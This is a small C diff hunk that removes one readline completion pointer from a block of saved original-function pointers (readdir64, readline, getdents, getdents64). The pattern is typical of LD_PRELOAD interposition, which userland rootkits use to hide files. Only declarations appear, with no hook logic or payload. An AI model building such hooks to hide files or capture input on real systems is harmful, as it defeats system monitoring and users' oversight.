@@ -59,7 +59,6 @@ static struct dirent64 *(*orig_readdir64)(DIR *) = NULL;
 static char *(*orig_readline)(const char *) = NULL;
 static char **(*orig_rl_completion_matches)(const char *, rl_compentry_func_t *) = NULL;
 static char *(*orig_rl_filename_completion_function)(const char *, int) = NULL;
-static rl_compentry_func_t *orig_rl_completion_entry_function = NULL;
 static long (*orig_getdents)(unsigned int, struct linux_dirent *, unsigned int) = NULL;
 static long (*orig_getdents64)(unsigned int, struct linux_dirent64 *, unsigned int) = NULL;
 
